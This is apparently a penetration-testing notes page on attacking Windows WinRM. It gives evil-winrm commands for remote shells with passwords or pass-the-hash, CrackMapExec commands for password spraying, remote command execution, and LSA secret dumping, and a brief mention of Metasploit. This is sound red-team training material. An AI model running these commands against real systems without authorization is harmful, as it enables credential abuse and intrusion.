# WinRM

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Windows dosent have a banner to say it is winrm.We can tell if it winrm by port  5985 - 5986
{% endhint %}

## Metasploit Metepreter Exploit

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Set paylaod metepreter

## &#x20;evil-winrm

`Evil-WinRM` is a popular post-exploitation tool used by red teamers and penetration testers to get a PowerShell remote shell on a Windows machine using **WinRM** (Windows Remote Management). It's especially useful when you have **valid credentials** (username + password or NTLM hash).

### üîß Requirements

* **Valid credentials** (username + password OR NTLM hash).
* **WinRM enabled** on the target (usually port **5985** for HTTP or **5986** for HTTPS).
* Ruby and Bundler (if installing from source) or use Kali Linux (already installed).

### üöÄ Basic Usage (with Password)

```bash
evil-winrm -i <TARGET-IP> -u <USERNAME> -p <PASSWORD>
```

Example:

```bash
evil-winrm -i 10.10.10.123 -u administrator -p 'Passw0rd!'
```

### üîê Using NTLM Hash (Pass-the-Hash)

```bash
evil-winrm -i <TARGET-IP> -u <USERNAME> -H <NTLM-HASH>
```

Example:

```bash
evil-winrm -i 10.10.10.123 -u administrator -H aad3b435b51404eeaad3b435b51404ee:6cb75f652a9b52798eb6cf2201057c73
```

## &#x20;crackmapexec

CrackMapExec is a Swiss Army knife for pentesters that helps automate:

* Credential validation across many hosts
* Lateral movement via SMB, WinRM, or others
* Executing commands remotely
* Harvesting credentials and hashes
* Checking SMB shares and system info

### Basic Usage Syntax

```bash
crackmapexec <protocol> <target> [options]
```

* `<protocol>`: `smb`, `winrm`, `rdp`, `mssql`, etc.
* `<target>`: IP, IP range, CIDR, or list of IPs (e.g., `10.10.10.0/24`)

### Common Examples

1. SMB Login Check with Username & Password

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123'
```

2. Using Username and NTLM Hash (Pass-the-Hash)

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -H <NTLM_HASH>
```

3. Using a Password List for Password Spraying

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -p /path/to/password_list.txt
```

4. Use with a File of Credentials

```
crackmapexec smb 10.10.10.0/24 -C creds.txt
```

Where `creds.txt` format:

```
username:password
user2:pass2
```

### Important Flags and Options

| Option        | Description                              |
| ------------- | ---------------------------------------- |
| `-u`          | Username                                 |
| `-p`          | Password or password list                |
| `-H`          | NTLM hash (pass-the-hash)                |
| `-d`          | Domain name                              |
| `-x`          | Execute command remotely                 |
| `--shares`    | List SMB shares                          |
| `--users`     | Enumerate users                          |
| `--lsa`       | Dump LSA secrets (requires privileges)   |
| `-M <module>` | Run a specific module (e.g., `mimikatz`) |

## Run commands on target

Basic syntax to run a command on a target

```
crackmapexec smb <target-ip-or-range> -u <username> -p <password> -x "<command>"
```

Example: Run `whoami` on a single host

```
crackmapexec smb 10.10.10.123 -u administrator -p 'Password123' -x "whoami"
```
